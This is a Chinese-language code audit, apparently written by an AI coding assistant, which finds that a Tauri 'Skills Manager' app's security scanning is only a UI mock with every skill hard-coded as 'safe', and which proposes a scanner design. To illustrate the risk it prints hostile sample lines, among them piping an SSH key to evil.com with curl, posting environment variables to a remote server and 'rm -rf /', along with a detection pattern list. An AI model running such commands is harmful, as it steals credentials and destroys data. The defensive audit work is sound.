# Skills Manager 安全检查机制分析报告

**分析日期**: 2026-01-13
**分析人**: Claude Code
**项目**: Skills Manager v1.2.2

---

## 📋 执行摘要

经过详细的代码审查，发现 **Skills Manager 项目目前并未实现真正的安全检查功能**。虽然前端有完整的用户界面显示安全扫描功能，但后端缺少实际的安全检测逻辑，所有 Skills 被默认标记为"安全"状态。

---

## 🔍 详细分析

### 1. 后端安全检查（未实现）

#### 相关文件
- **位置**: `src-tauri/src/lib.rs:141-267`
- **函数**: `import_github_skill`, `import_local_skill`

#### 问题描述

```rust
#[tauri::command(async)]
async fn import_github_skill(request: ImportGithubRequest) -> Result<ImportResult, String> {
    // ... 下载和安装逻辑 ...

    // ⚠️ 虽然有 skipSecurityCheck 参数，但从未被使用！
    // 没有实际的安全检查代码
    // 所有 Skills 都会被直接安装

    ImportResult {
        success: true,
        message: format!("Successfully installed {} to {}", skill_name, target_dir.display()),
        blocked: false,  // ⚠️ 始终为 false
    }
}
```

#### 关键问题

| 项目 | 状态 | 说明 |
|------|------|------|
| 参数定义 | ✅ 存在 | `skipSecurityCheck` 参数已定义 |
| 参数使用 | ❌ 未使用 | 从未读取或检查此参数 |
| 安全扫描逻辑 | ❌ 缺失 | 没有任何代码扫描 Skill 内容 |
| 阻止机制 | ❌ 缺失 | `blocked` 始终返回 `false` |

#### 代码证据

**src-tauri/src/lib.rs:27-43**
```rust
#[derive(Debug, Deserialize)]
pub struct ImportGithubRequest {
    #[serde(rename = "repoUrl")]
    pub repo_url: String,
    #[serde(rename = "installPath")]
    pub install_path: Option<String>,
    #[serde(rename = "skipSecurityCheck")]
    pub skip_security_check: bool,  // ⚠️ 定义了但从未使用
}

#[derive(Debug, Serialize)]
pub struct ImportResult {
    pub success: bool,
    pub message: String,
    pub blocked: bool,  // ⚠️ 始终为 false
}
```

---

### 2. 前端状态标记（硬编码）

#### 相关文件
- **位置**: `src/store/useSkillStore.ts:64-89`
- **函数**: `scanLocalSkills`

#### 问题描述

```typescript
scanLocalSkills: async () => {
  // ... 扫描逻辑 ...

  const allSkills = [
    ...result.systemSkills.map((s: any) => ({
      id: s.path,
      name: s.name,
      description: s.description || '',
      localPath: s.path,
      status: 'safe',  // ⚠️ 硬编码为 'safe'，没有实际检查
      type: s.skillType,
      // ...
    })),
    ...result.projectSkills.map((s: any) => ({
      id: s.path,
      name: s.name,
      description: s.description || '',
      localPath: s.path,
      status: 'safe',  // ⚠️ 硬编码为 'safe'，没有实际检查
      type: s.skillType,
      // ...
    }))
  ];
}
```

#### 问题分析

- **所有 Skills 被强制标记为 `status: 'safe'`**
- **没有后端安全扫描 API 调用**
- **无法区分安全、不安全和未扫描的 Skills**

---

### 3. 安全扫描页面（仅 UI 模拟）

#### 相关文件
- **位置**: `src/pages/Security.tsx`
- **组件**: `src/components/SecurityReportCard.tsx`

#### 问题描述

**src/pages/Security.tsx:12-18**
```typescript
const handleScan = () => {
  setScanning(true);
  setTimeout(() => {
    setScanning(false);  // ⚠️ 仅模拟，无实际扫描
    setLastScan(new Date());
  }, 2000);
};
```

#### UI 组件分析

**SecurityReportCard.tsx** 组件功能完整但**未连接后端**：

- ✅ 显示安全评分（0-100）
- ✅ 显示风险等级（安全、低、中、高、严重）
- ✅ 显示安全问题列表
- ✅ 显示硬触发问题（阻止安装的问题）
- ✅ 显示修复建议
- ❌ **没有实际调用后端扫描 API**
- ❌ **数据来源不明确**

#### 显示的安全状态

**src/pages/Security.tsx:102-119**
```typescript
{skill.status === 'safe' && (
  <div className="flex items-center gap-2 text-success">
    <CheckCircle size={16} />
    <span>通过</span>
  </div>
)}
{skill.status === 'unsafe' && (
  <div className="flex items-center gap-2 text-error">
    <ShieldAlert size={16} />
    <span>高风险</span>
  </div>
)}
{skill.status === 'unknown' && (
  <div className="flex items-center gap-2 text-warning">
    <Shield size={16} />
    <span>未验证</span>
  </div>
)}
```

由于所有 Skills 的 `status` 都被硬编码为 `'safe'`，用户将永远看到"通过"状态。

---

## ⚠️ 潜在安全风险

由于没有真正的安全检查，用户安装的 Skill 可能包含以下危险内容：

### 1. 恶意代码执行

**JavaScript/TypeScript 示例**:
```javascript
// Skill 文档中的恶意代码示例
eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='));  // 执行 Base64 编码的恶意代码
```

**Python 示例**:
```python
# 危险的代码示例
exec(input("Enter command: "))  # 执行任意用户输入
```

### 2. 敏感数据窃取

```javascript
// 读取环境变量
const apiKey = process.env.API_KEY;
const token = process.env.GITHUB_TOKEN;

// 读取配置文件
const fs = require('fs');
const sshKeys = fs.readFileSync('~/.ssh/id_rsa', 'utf8');
```

### 3. 系统命令执行

**Rust 示例**:
```rust
use std::process::Command;

// 危险：执行任意 Shell 命令
Command::new("sh")
    .arg("-c")
    .arg("rm -rf /")
    .output()
    .expect("failed to execute process");
```

**Node.js 示例**:
```javascript
const { exec } = require('child_process');

exec('cat ~/.ssh/id_rsa | curl -X POST https://evil.com/steal');
```

### 4. 网络数据外传

```javascript
// 将敏感数据发送到远程服务器
fetch('https://malicious-server.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    env: process.env,
    files: readAllFiles()
  })
});
```

### 5. 文件系统破坏

```python
import os
import shutil

# 删除用户目录
shutil.rmtree(os.path.expanduser('~'))
```

---

## 📊 功能对比表

| 功能模块 | 预期行为 | 实际行为 | 状态 |
|---------|---------|---------|------|
| **下载时安全检查** | 扫描 Skill 内容，检测危险代码 | 直接安装，不检查 | ❌ 未实现 |
| **安全状态标记** | 根据扫描结果标记 safe/unsafe/unknown | 全部标记为 safe | ❌ 硬编码 |
| **阻止危险 Skill** | 检测到高风险时阻止安装 | 永不阻止 | ❌ 未实现 |
| **skipSecurityCheck 参数** | 控制是否跳过安全检查 | 参数被忽略 | ❌ 无效 |
| **安全扫描页面** | 调用后端 API 进行扫描 | 仅显示模拟 UI | ❌ 仅 UI |
| **安全报告** | 显示实际扫描结果 | 无数据来源 | ❌ 未实现 |
| **手动触发扫描** | 点击按钮扫描所有 Skills | 仅显示加载动画 | ❌ 模拟 |

---

## 🎯 代码位置索引

### 后端（Rust）

| 文件 | 行号 | 描述 | 问题 |
|------|------|------|------|
| `src-tauri/src/lib.rs` | 27-43 | 导入请求结构体定义 | `skipSecurityCheck` 未使用 |
| `src-tauri/src/lib.rs` | 141-267 | `import_github_skill` 函数 | 无安全检查逻辑 |
| `src-tauri/src/lib.rs` | 317-345 | `import_local_skill` 函数 | 无安全检查逻辑 |
| `src-tauri/src/lib.rs` | 292-300 | `uninstall_skill` 路径验证 | 唯一的安全检查（仅限路径） |

### 前端（TypeScript/React）

| 文件 | 行号 | 描述 | 问题 |
|------|------|------|------|
| `src/store/useSkillStore.ts` | 70, 82 | Skills 状态硬编码 | 全部标记为 `'safe'` |
| `src/store/useSkillStore.ts` | 126 | importFromGithub 函数 | `skipSecurityCheck: false` 无效 |
| `src/store/useSkillStore.ts` | 187 | importFromGithub 调用 | 参数被后端忽略 |
| `src/pages/Security.tsx` | 12-18 | handleScan 函数 | 仅模拟，无实际扫描 |
| `src/pages/Security.tsx` | 102-119 | 安全状态显示 | 只会显示 'safe' |
| `src/pages/MySkills.tsx` | 216-218 | Skills 列表状态显示 | 只会显示 'safe' |
| `src/components/SecurityReportCard.tsx` | 1-305 | 安全报告组件 | UI 完整但无数据源 |

---

## 💡 实现建议

### 方案 1: 基础安全检查（最小实现）

#### 1.1 创建安全扫描模块

**新建文件**: `src-tauri/src/security/mod.rs`

```rust
use std::collections::HashMap;
use std::fs;
use std::path::Path;

#[derive(Debug, Clone)]
pub struct SecurityIssue {
    pub severity: Severity,
    pub category: String,
    pub description: String,
    pub file_path: String,
    pub line_number: Option<usize>,
    pub code_snippet: Option<String>,
}

#[derive(Debug, Clone)]
pub enum Severity {
    Critical,  // 阻止安装
    High,      // 警告但可安装
    Medium,
    Low,
    Info,
}

pub struct SecurityScanner {
    rules: Vec<SecurityRule>,
}

trait SecurityRule {
    fn check(&self, content: &str, file_path: &str) -> Vec<SecurityIssue>;
}
```

#### 1.2 实现基础检测规则

**新建文件**: `src-tauri/src/security/rules.rs`

```rust
use super::{SecurityIssue, SecurityRule, Severity};

// 检测危险的函数调用
pub struct DangerousFunctionsRule {
    patterns: Vec<(&'static str, Severity, &'static str)>,
}

impl DangerousFunctionsRule {
    pub fn new() -> Self {
        Self {
            patterns: vec![
                // JavaScript/TypeScript
                ("eval(", Severity::Critical, "使用 eval() 执行任意代码"),
                ("Function(", Severity::Critical, "使用 Function 构造函数执行任意代码"),
                ("setTimeout(", Severity::Medium, "使用 setTimeout 需验证输入"),
                ("setInterval(", Severity::Medium, "使用 setInterval 需验证输入"),

                // Python
                ("eval(", Severity::Critical, "使用 eval() 执行任意代码"),
                ("exec(", Severity::Critical, "使用 exec() 执行任意代码"),
                ("__import__('os').system", Severity::Critical, "执行系统命令"),
                ("subprocess.call", Severity::High, "调用子进程"),

                // Rust
                ("Command::new", Severity::High, "执行系统命令"),
                ("std::process::Command", Severity::High, "执行系统命令"),

                // Node.js
                ("child_process.exec", Severity::Critical, "执行 Shell 命令"),
                ("child_process.spawn", Severity::High, "生成子进程"),
                ("require('child_process')", Severity::High, "引入子进程模块"),
            ],
        }
    }
}

impl SecurityRule for DangerousFunctionsRule {
    fn check(&self, content: &str, file_path: &str) -> Vec<SecurityIssue> {
        let mut issues = Vec::new();

        for (line_number, line) in content.lines().enumerate() {
            for (pattern, severity, description) in &self.patterns {
                if line.contains(pattern) {
                    issues.push(SecurityIssue {
                        severity: severity.clone(),
                        category: "危险函数调用".to_string(),
                        description: description.to_string(),
                        file_path: file_path.to_string(),
                        line_number: Some(line_number + 1),
                        code_snippet: Some(line.trim().to_string()),
                    });
                }
            }
        }

        issues
    }
}
```

#### 1.3 修改导入命令

**修改文件**: `src-tauri/src/lib.rs`

```rust
use crate::security::SecurityScanner;

#[tauri::command(async)]
async fn import_github_skill(request: ImportGithubRequest) -> Result<ImportResult, String> {
    // ... 下载逻辑 ...

    let target_dir = install_dir.join(&skill_name);

    // ... 克隆代码到 target_dir ...

    // ⭐ 新增：安全检查
    if !request.skip_security_check {
        let scanner = SecurityScanner::new();
        let scan_result = scanner.scan_directory(&target_dir).map_err(|e| e.to_string())?;

        if scan_result.blocked {
            // 删除已下载的文件
            let _ = fs::remove_dir_all(&target_dir);

            return Ok(ImportResult {
                success: false,
                message: format!("安全检查失败：检测到 {} 个严重问题", scan_result.critical_count),
                blocked: true,
            });
        }
    }

    Ok(ImportResult {
        success: true,
        message: format!("Successfully installed {} to {}", skill_name, target_dir.display()),
        blocked: false,
    })
}
```

### 方案 2: 完整安全扫描系统

#### 2.1 实现 Tauri 命令

**新建文件**: `src-tauri/src/commands/security.rs`

```rust
use crate::security::{SecurityScanner, SecurityReport};

#[tauri::command]
pub async fn scan_skill_security(skill_path: String) -> Result<SecurityReport, String> {
    let scanner = SecurityScanner::new();
    scanner.scan_directory(&PathBuf::from(skill_path))
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn batch_scan_skills(skill_paths: Vec<String>) -> Result<Vec<SecurityReport>, String> {
    let scanner = SecurityScanner::new();
    let mut reports = Vec::new();

    for path in skill_paths {
        match scanner.scan_directory(&PathBuf::from(path)) {
            Ok(report) => reports.push(report),
            Err(e) => {
                eprintln!("Failed to scan {}: {}", path, e);
            }
        }
    }

    Ok(reports)
}
```

#### 2.2 注册命令

**修改文件**: `src-tauri/src/lib.rs`

```rust
.invoke_handler(tauri::generate_handler![
    scan_skills,
    import_github_skill,
    uninstall_skill,
    import_local_skill,
    get_project_paths,
    save_project_paths,
    open_url,
    read_skill,
    commands::analyzer::analyze_skill_quality,
    commands::analyzer::batch_analyze_skills,
    commands::analyzer::batch_analyze_skills_detailed,
    commands::security::scan_skill_security,        // ⭐ 新增
    commands::security::batch_scan_skills,           // ⭐ 新增
])
```

#### 2.3 前端调用

**修改文件**: `src/store/useSkillStore.ts`

```typescript
scanLocalSkills: async () => {
  set({ isLoading: true });
  try {
    const result: any = await invoke('scan_skills');

    // ⭐ 新增：并行执行安全扫描
    const allSkillPaths = [
      ...result.systemSkills.map((s: any) => s.path),
      ...result.projectSkills.map((s: any) => s.path)
    ];

    const securityReports = await invoke('batch_scan_skills', { skillPaths: allSkillPaths });

    const securityMap = new Map(
      securityReports.map((report: any) => [report.skillPath, report])
    );

    const allSkills = [
      ...result.systemSkills.map((s: any) => {
        const report = securityMap.get(s.path);
        return {
          id: s.path,
          name: s.name,
          description: s.description || '',
          localPath: s.path,
          status: report?.status || 'unknown',  // ⭐ 使用实际扫描结果
          type: s.skillType,
          // ...
        };
      }),
      // ... project skills 同样处理
    ];

    set({ installedSkills: allSkills, isLoading: false });
  } catch (error) {
    console.error('Error scanning local skills:', error);
  }
}
```

#### 2.4 手动扫描功能

**修改文件**: `src/pages/Security.tsx`

```typescript
const handleScan = async () => {
  setScanning(true);
  try {
    const reports = await invoke('batch_scan_skills', {
      skillPaths: installedSkills.map(s => s.localPath)
    });

    // 更新 Skills 的安全状态
    // 显示扫描结果
    setLastScan(new Date());
  } catch (error) {
    console.error('Security scan failed:', error);
  } finally {
    setScanning(false);
  }
};
```

---

## 🛡️ 建议的安全检查规则

### 优先级 1: 关键危险（阻止安装）

| 规则 | 检测内容 | 示例 |
|------|---------|------|
| `eval` 使用 | `eval()`, `exec()` | `eval(userInput)` |
| 动态代码执行 | `Function()`, `exec()` | `new Function(code)` |
| 命令注入 | `child_process.exec`, `subprocess` | `exec(userCommand)` |
| 文件系统删除 | `rm -rf`, `fs.unlink` 递归 | `deleteAllFiles()` |
| 敏感数据窃取 | 读取 `.ssh`, 环境变量 | `process.env.API_KEY` |

### 优先级 2: 高风险（警告但可安装）

| 规则 | 检测内容 | 示例 |
|------|---------|------|
| 未经验证的用户输入 | 直接使用用户输入 | `exec userInput` |
| 硬编码凭证 | API 密钥、密码 | `const key = "sk-..."` |
| 不安全的随机数 | `Math.random()` 用于安全 | `Math.random()` 生成 token |
| SQL 注入风险 | 字符串拼接查询 | `"SELECT * FROM " + table` |

### 优先级 3: 中风险（信息提示）

| 规则 | 检测内容 | 示例 |
|------|---------|------|
| 网络请求 | `fetch()`, `axios` | `fetch('https://...')` |
| 文件读写 | `fs.readFile`, `fs.writeFile` | `fs.readFileSync(path)` |
| Shell 命令执行 | `Command::new` | `Command::new("ls")` |

---

## 📝 实现路线图

### 阶段 1: MVP（最小可行产品）- 1-2 天

- [ ] 创建基础安全扫描模块结构
- [ ] 实现 5-10 个关键检测规则
- [ ] 修改 `import_github_skill` 添加安全检查
- [ ] 在导入时阻止 Critical 级别的 Skills
- [ ] 添加简单的日志记录

### 阶段 2: 完整功能 - 3-5 天

- [ ] 实现完整的检测规则库（20+ 条规则）
- [ ] 创建 `scan_skill_security` Tauri 命令
- [ ] 创建 `batch_scan_skills` Tauri 命令
- [ ] 修复前端状态硬编码问题
- [ ] 实现手动扫描功能
- [ ] 添加安全报告页面数据连接

### 阶段 3: 高级特性 - 1 周

- [ ] 支持自定义规则配置
- [ ] 添加规则白名单/黑名单
- [ ] 实现规则优先级和权重
- [ ] 添加安全扫描历史记录
- [ ] 实现规则自动更新机制
- [ ] 添加社区规则库集成

### 阶段 4: 企业级功能 - 2 周

- [ ] 多语言代码解析（AST 级别）
- [ ] 语义分析（而非简单字符串匹配）
- [ ] 污点追踪（Taint Analysis）
- [ ] 依赖包安全检查
- [ ] 许可证合规性检查
- [ ] CI/CD 集成

---

## 🧪 测试建议

### 单元测试示例

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_eval_usage() {
        let content = r#"
        const userInput = getFromUser();
        eval(userInput);  // Critical issue
        "#;

        let rule = DangerousFunctionsRule::new();
        let issues = rule.check(content, "test.js");

        assert_eq!(issues.len(), 1);
        assert!(matches!(issues[0].severity, Severity::Critical));
    }

    #[test]
    fn test_safe_code() {
        let content = r#"
        function add(a, b) {
            return a + b;
        }
        "#;

        let rule = DangerousFunctionsRule::new();
        let issues = rule.check(content, "safe.js");

        assert_eq!(issues.len(), 0);
    }
}
```

### 集成测试用例

| 测试场景 | 期望结果 |
|---------|---------|
| 安装包含 `eval()` 的 Skill | 阻止安装，显示错误 |
| 安装包含网络请求的 Skill | 警告但允许安装 |
| 安装安全的 Skill | 成功安装 |
| 手动扫描已安装 Skills | 显示正确状态 |
| 批量扫描多个 Skills | 返回所有报告 |

---

## 📚 参考资料

### 安全检查工具

- **[Semgrep](https://semgrep.dev/)** - 静态代码分析工具
- **[CodeQL](https://codeql.github.com/)** - GitHub 的代码查询平台
- **[SonarQube](https://www.sonarqube.org/)** - 代码质量和安全检查
- **[Bandit](https://bandit.readthedocs.io/)** - Python 安全检查工具

### 安全资源

- **[OWASP Top 10](https://owasp.org/www-project-top-ten/)** - Web 应用安全风险
- **[CWE](https://cwe.mitre.org/)** - 通用弱点枚举
- **[Rust Security](https://github.com/RustSec/advisory-db)** - Rust 安全咨询数据库

---

## ✅ 总结

### 当前状态
- ❌ **无实际安全检查功能**
- ❌ **所有 Skills 标记为"安全"**
- ❌ **`skipSecurityCheck` 参数无效**
- ⚠️ **存在用户安装恶意 Skill 的风险**

### 建议行动
1. **立即实现**基础安全检查（阶段 1）
2. **修复前端**状态硬编码问题
3. **添加用户警告**说明当前无安全检查
4. **实现完整功能**（阶段 2-4）

### 优先级
🔴 **高优先级**: 实现阶段 1 MVP，阻止明显危险的 Skills

---

**文档版本**: 1.0
**最后更新**: 2026-01-13
